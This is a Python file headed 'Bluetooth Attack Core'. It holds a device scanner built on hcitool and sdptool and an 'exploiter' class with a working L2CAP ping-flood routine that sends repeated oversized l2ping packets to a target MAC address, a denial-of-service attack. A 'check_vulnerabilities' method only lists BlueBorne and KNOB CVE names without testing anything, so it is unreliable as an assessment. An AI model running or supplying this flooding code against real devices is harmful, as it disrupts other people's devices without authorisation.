"""Bluetooth Attack Core"""
import subprocess, json, os, time
from datetime import datetime

class BTScanner:
    def __init__(self, interface="hci0"):
        self.interface = interface
    
    def scan_classic(self, duration=10):
        devices = []
        try:
            result = subprocess.check_output(["hcitool", "-i", self.interface, "scan", "--length", str(duration)], text=True, timeout=duration+5)
            for line in result.strip().split("\n")[1:]:
                parts = line.strip().split("\t")
                if len(parts) >= 2:
                    devices.append({"mac": parts[0], "name": parts[1] if len(parts) > 1 else "Unknown", "type": "classic"})
        except: pass
        return devices
    
    def scan_ble(self, duration=10):
        devices = []
        try:
            result = subprocess.check_output(["hcitool", "-i", self.interface, "lescan", "--duplicates"], text=True, timeout=duration)
        except subprocess.TimeoutExpired as e:
            if e.output:
                for line in e.output.decode(errors="ignore").split("\n"):
                    parts = line.strip().split(" ", 1)
                    if len(parts) >= 2 and ":" in parts[0]:
                        devices.append({"mac": parts[0], "name": parts[1], "type": "ble"})
        except: pass
        return devices
    
    def device_info(self, mac):
        info = {"mac": mac, "services": [], "characteristics": []}
        try:
            result = subprocess.check_output(["sdptool", "browse", mac], text=True, timeout=15)
            for line in result.split("\n"):
                if "Service Name:" in line:
                    info["services"].append(line.split("Service Name:")[1].strip())
        except: pass
        return info

class BTExploiter:
    def __init__(self, interface="hci0"):
        self.interface = interface
    
    def ping_flood(self, target_mac, count=100, size=600):
        """L2CAP ping flood"""
        print(f"[*] Ping flood: {target_mac} ({count} packets, {size} bytes)")
        try:
            for i in range(count):
                subprocess.run(["l2ping", "-i", self.interface, "-c", "1", "-s", str(size), target_mac],
                              capture_output=True, timeout=5)
                if i % 10 == 0: print(f"  Sent {i}/{count}", end="\r")
        except: pass
        print(f"\n[+] Sent {count} packets")
    
    def check_vulnerabilities(self, target_mac):
        """Check for known Bluetooth vulnerabilities"""
        findings = []
        info = BTScanner(self.interface).device_info(target_mac)
        for vuln_name, cve in {
            "BlueBorne": "CVE-2017-0781",
            "KNOB": "CVE-2019-9506",
        }.items():
            findings.append({"name": vuln_name, "cve": cve, "status": "needs_testing"})
        return findings
